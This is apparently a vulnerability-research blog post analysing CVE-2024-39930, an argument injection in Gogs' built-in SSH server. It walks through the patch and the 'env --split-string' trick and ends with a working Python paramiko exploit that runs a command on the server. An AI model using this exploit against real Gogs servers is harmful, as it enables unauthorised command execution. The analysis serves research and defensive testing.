---
title: CVE-2024-39930 PoC - gogs ssh in-built server RCE
date: 2025-06-29 08:05:00 +0800
categories: [Vulnerability Research, Exploit Development]
tags: [remote code execution]
math: true
mermaid: true
media_subpath: /assets/posts/2025-06-29-gogs-RCE-PoC
image:
  path: preview.png
---

# Vulnerability anaylsis and PoC Development for CVE-2024-39930

## Introduction
**Gogs** is a lightweight and self-hosted Git service that's simple to set up and ideal for organizations that prefer to keep their source code off third-party platforms like GitHub. While Gogs offers many of the same features as GitHub, its self-hosted nature makes it particularly attractive for internal development environments and private code repositories.

Recently, a **vulnerability was discovered in Gogs versions <= 0.13.0**, specifically in its **built-in SSH server**. This flaw allows **argument injection** via specially crafted SSH connections.

The vulnerability, tracked as [CVE-2024-39930](https://github.com/advisories/GHSA-vm62-9jw3-c8w3), is particularly dangerous when the SSH server is enabled and exposed, as it can allow attackers to execute unintended commands by manipulating environment variables passed during SSH authentication.

While the [SonarSource blog post](https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1) and the [Vicarius write-up](https://www.vicarius.io/vsociety/posts/argument-injection-in-gogs-ssh-server-cve-2024-39930) provide excellent analysis and explanation of the root cause of this vulnerability, **no public proof-of-concept (PoC) exploit code had been released** at the time of this writing.

As a security researcher and exploit developer, I decided to dive deeper into this vulnerability and **craft an exploit** to make testing and validation easier for both **penetration testers and defenders**.

## Vulnerability Analysis
Gogs includes a built-in SSH server that enables users to push and pull Git repositories over SSH. This functionality can be activated by an administrator. To implement this feature, Gogs relies on the `golang.org/x/crypto/ssh package`, which provides an implementation of the SSH protocol, including support for authentication, session handling, and encrypted communication.

After a successful TCP connection and authentication, the Gogs SSH server begins listening for incoming requests from the client. In a typical interactive SSH session, a user might request a shell, which the server would then provide. However, in the case of Git over SSH, the interaction is non-interactive and relies on a specific sequence of SSH requests, namely env and exec.

- The `env` request allows the client to set environment variables within the SSH session.

- The `exec` request is used to launch a Git process such as `git-upload-pack` or `git-receive-pack `on the server, enabling Git operations like push or pull.

It is important to note that while the exec request can start a process, it is typically restricted to Git-related commands within the Gogs environment. This means the exec request cannot be freely used to execute arbitrary system commands, which is an intentional security limitation.

When reviewing the [official advisory](https://github.com/advisories/GHSA-vm62-9jw3-c8w3), i noticed that the linked patch commit provides valuable insight into the fix. The relevant commit can be found here: [gogs/gogs#7868](https://github.com/gogs/gogs/pull/7868/commits/df245d776b6f9c0d4920c9baaa1a57413d220fd3), and it serves as a great starting point for analyzing the vulnerability.

In this patch, we can observe that within the `internal/ssh/ssh.go` file, a significant portion of the code responsible for handling the `env` SSH request was removed from the `switch` case statement. This removal indicates that the `env` command handling was likely deemed unnecessary or insecure in the context of how Gogs processes SSH requests.

![GitHub Commit Diff](git_diff.png)

The highlighted code on line `73` is particularly interesting because it executes an OS command. Its intended purpose is to set environment variables for the SSH session using a command like `env <VAR_NAME>=<value>`. 

At first glance, command injection might seem unlikely since the arguments are passed as an array, not a raw command string. However, both the [official advisory](https://github.com/advisories/GHSA-vm62-9jw3-c8w3) and the [SonarSource blog post](https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1) reveal that argument injection is still possible under certain conditions.

According to the [SonarSource blog post](https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1), it is possible to inject arguments into the `env` command like this:

```
mcsam@0x32:~$ env --foo=bar
env: unrecognized option '--foo=bar'
Try 'env --help' for more information.
```

The presence of `--` causes the `env` binary to treat the input as a command-line switch rather than an environment variable. This gives an attacker control over how `env` behaves and may allow them to alter its execution flow. In some scenarios, they could even supply a valid switch that leads to command execution.

When abused, it could allow an attacker to pass positional arguments directly to the command executed by `env`. By inspecting the `env --help` output, we can identify several such switches that could be misused, with `--split-string` being particularly relevant in this case.

```
mcsam@0x32:~$ env --help
Usage: env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]
Set each NAME to VALUE in the environment and run COMMAND.

Mandatory arguments to long options are mandatory for short options too.
  -i, --ignore-environment  start with an empty environment
  -0, --null           end each output line with NUL, not newline
  -u, --unset=NAME     remove variable from the environment
  -C, --chdir=DIR      change working directory to DIR
  -S, --split-string=S  process and split S into separate arguments;
                        used to pass multiple arguments on shebang lines
      --block-signal[=SIG]    block delivery of SIG signal(s) to COMMAND
      --default-signal[=SIG]  reset handling of SIG signal(s) to the default
      --ignore-signal[=SIG]   set handling of SIG signals(s) to do nothing
      --list-signal-handling  list non default signal handling to stderr
  -v, --debug          print verbose information for each processing step
      --help     display this help and exit
      --version  output version information and exit
```

We can see this behavior in action with a simple example: 
```
mcsam@0x32:~$ env '--split-string=echo hack'
hack
```

Here, the `--split-string` option causes `env` to interpret the string `echo hack` as a command to execute. Instead of setting an environment variable, it runs `echo hack`, demonstrating how an attacker could laverage this to run arbitrary commands using specially crafted input.

## Exploitation

### Exploitation Requirements

To successfully exploit this vulnerability, a few conditions must be met:

- The built-in SSH server in Gogs must be **enabled**.
- An authenticated **user account** is required. (This can be bypassed if the server allows open account registration.)

![SSH In-Built Server Enabled Requirement](ssh_in_built_enabled_req.png)

Administrators can verify whether the SSH server is enabled by visiting the `/admin/config` page in the web interface.

---

### Setting Malicious Environment Variables

Once these conditions are met, exploitation becomes possible by injecting specially crafted environment variables through the SSH `env` request. However, there’s a challenge: as noted in the [Vicarius write-up](https://www.vicarius.io/vsociety/posts/argument-injection-in-gogs-ssh-server-cve-2024-39930), **the dash character (`-`) is not valid in environment variable names**.

This poses a problem—**we can't directly use `--split-string` as the name of an environment variable**, which is essential for triggering the vulnerable behavior in `env`.

```
mcsam@0x32:~$ export '--split-string=echo hack'
bash: export: --: invalid option
export: usage: export [-fn] [name[=value] ...] or export -p
```

### Bypassing OS level Environment Variable restriction
In typical scenarios, the SSH client picks up environment variables from the local system and sends them to the server only if explicitly allowed. But what if we could bypass this behavior entirely?

Instead of relying on the client to **automatically fetch** environment variables from the system, we can try to directly provide the SSH client with the exact environment variable we want it to send. This would allow us to inject malicious values, such as `--split-string`, even though the name itself is not valid as a system environment variable.

By manually crafting the SSH request or using a custom SSH client that supports arbitrary `env` requests, we can override the default behavior and **inject environment variables that would otherwise be blocked** at the OS level. This opens the door to argument injection, even in restrictive environments.

Buckle up! In the next sections, we’ll walk through crafting a working exploit to leverage this vulnerability in `Gogs`.

### Setting up Gogs enviroment
For readers who would like to replicate this vulnerability, I’ve created a quick automated script that sets up a vulnerable `Gogs` instance. This allows you to focus entirely on exploitation without getting bogged down in the setup process.

You can access the script here: [Download gogs_install.sh](https://github.com/theMcSam/CVE-2024-39930-PoC/blob/main/gogs_install.sh)

#### 🛠️ Quick Setup Steps

1. **Start with a fresh VM instance.**
2. **Place** the `gogs_install.sh` script in the `/root` directory.
3. **Make it executable**:
  ```
  chmod +x /root/gogs_install.sh
  ```
4. Run the script and wait for it to complete:
  ```
  ./gogs_install.sh
  ```

Once the script finishes, you’ll have a running Gogs instance ready for testing.

As mentioned earlier, to exploit this vulnerability, you’ll need an account on the `Gogs` instance. If user registration is enabled, you can simply sign up through the web interface.

![User Account Sign-Up](user_account_signup.png)

After creating your account, the next step is to **generate an SSH key pair** and **upload your public key** to your Gogs profile. This key will be used to authenticate over SSH and is required to trigger the vulnerability.


Next, navigate to your account settings page for SSH keys at: `/user/settings/ssh` 

Paste your **SSH public key** into the provided field and give it a descriptive **key name**.

![SSH Public Key Add](ssh_add_pub_key.png)

Once the key is added, your account is ready to authenticate over SSH.

Lastly, we’ll need to create a new repository in Gogs that we can interact with over **Git-over-SSH**.

![Gogs Repo Create](git_repo_created_and_Git_over_SSH.png)

As shown in the image above, after creating a repository, Gogs provides an SSH URL which allows us to push and pull from the repo using the SSH protocol. This is exactly what we need to trigger and test the argument injection vulnerability.

---

With our environment set up and SSH access configured, we can now move on to developing exploit code to target this vulnerability.

### Developing a Proof of Concept
Even though the operating system restricts us from setting environment variables with invalid names (such as those starting with a dash), we can work around this limitation by using Python’s `paramiko` module to build a custom SSH client.

With `paramiko`, we can programmatically send custom environment variables during the SSH session by using the [`set_environment_variable()`](https://docs.paramiko.org/en/stable/api/channel.html#paramiko.channel.Channel.set_environment_variable) method. This method takes two arguments:

- The **environment variable name**
- The **environment variable value**

To demonstrate this vulnerability, we'll build a simple SSH client using Python's `paramiko` library. This allows us to send custom environment variables using the `set_environment_variable()` method—something standard SSH clients typically restrict.

---

#### Step 1: Connect to the Target via SSH

Start by establishing an SSH connection to the target Gogs server:

```python
import paramiko

key = paramiko.RSAKey.from_private_key_file("/path/to/private/key") # Path to the private key
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect(
    hostname="172.16.73.143",
    port=2222, # Custom port used by Gogs' in-built SSH server
    username="mcsam", # Gogs username
    pkey=key
)
```

#### Step 2: Open a Session and Send the Malicious env Request

After connecting, open a new SSH session. Then, send a malicious environment variable using the `--split-string` option, which allows us to pass a command that gets executed on the server.

```python
session = client.get_transport().open_session()

# Inject the malicious environment variable
session.set_environment_variable("--split-string", "touch /tmp/pwneeeddddddddddd")

# Trigger Git-over-SSH with a valid repo path
session.exec_command("git-upload-pack /<user>/<repo>.git")
```

#### Step 3: Capture Output and Close the Session

Capture the output streams to observe results or errors from the command execution:

```python
stdout = session.makefile('rb', 1024)
stderr = session.makefile_stderr('rb', 1024)

print("[+] STDOUT:")
print(stdout.read().decode())

print("[!] STDERR:")
print(stderr.read().decode())

session.close()
client.close()
```

#### Step 4: Final Combined Script

Here’s the complete PoC, with placeholders to be replaced:
```python
import paramiko

key = paramiko.RSAKey.from_private_key_file("./id_rsa")
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect(
    hostname="172.16.73.143",
    port=2222,
    username="mcsam",
    pkey=key
)

session = client.get_transport().open_session()

session.set_environment_variable("--split-string", "touch /tmp/pwneeeddddddddddd")
session.exec_command("git-upload-pack /mcsam/test.git")

stdout = session.makefile('rb', 1024)
stderr = session.makefile_stderr('rb', 1024)

print("[+] STDOUT:")
print(stdout.read().decode())

print("[!] STDERR:")
print(stderr.read().decode())

session.close()
client.close()
```

If everything works as expected, the exploit will run without errors, and the file `/tmp/pwneeeddddddddddd` will be created on the target server, confirming that command execution was successful.

## Verifying / Testing the Exploit

In the video below, I demonstrate a proof-of-concept exploit for the Gogs vulnerability (CVE-2024-39930):


<iframe width="700" height="500" src="https://www.youtube.com/embed/ylQUgvktiMM" title="CVE-2024-39930 PoC gogs RCE exploitation" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>


For convenience, I’ve also created a fully automated exploit script that handles everything — from uploading SSH keys to creating a repository and executing the payload.

You can find the full exploit code on GitHub:  
🔗 [theMcSam/CVE-2024-39930-PoC](https://github.com/theMcSam/CVE-2024-39930-PoC)

## References
- https://github.com/advisories/GHSA-vm62-9jw3-c8w3
- https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1/
- https://www.vicarius.io/vsociety/posts/argument-injection-in-gogs-ssh-server-cve-2024-39930
